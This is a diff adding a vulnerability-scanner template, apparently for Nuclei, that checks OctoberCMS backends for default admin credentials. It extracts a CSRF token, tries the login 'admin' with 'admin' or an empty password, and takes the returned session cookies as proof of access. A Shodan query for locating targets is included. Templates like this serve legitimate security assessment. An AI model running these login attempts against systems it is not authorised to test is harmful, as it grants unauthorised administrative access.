@@ -1,0 +1,65 @@
+id: octobercms-default-login
+
+info:
+  name: OctoberCMS - Default Admin Discovery
+  author: princechaddha
+  severity: high
+  description: OctoberCMS default admin credentials were discovered.
+  reference:
+    - https://github.com/octobercms/october
+    - https://octobercms.com/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    max-request: 4
+    shodan-query: http.component:"October CMS"
+  tags: octobercms,default-login,oss
+
+http:
+  - raw:
+      - |
+        GET /backend/backend/auth/signin HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+      - |
+        POST /backend/backend/auth/signin HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _token={{token}}&postback=1&login={{username}}&password={{password}}
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+        - ""
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "october_session="
+          - "admin_auth="
+        condition: and
+
+      - type: status
+        status:
+          - 302
+
+    extractors:
+      - type: regex
+        part: body
+        name: token
+        internal: true
+        group: 1
+        regex:
+          - 'meta name="csrf\-token" content="([A-Za-z0-9]+)">'
+
+# digest: 4b0a004830460221008c9a98bee55491e7fe022bdcc030f081bf74c377b2de0061057ad20cadcb33a2022100e8ea2fb0bdee7e31aa27be618dcf8e91cfd91ae54928b37de4c70b77c43ffa89:922c64590222798bb761d5b6d8e72950
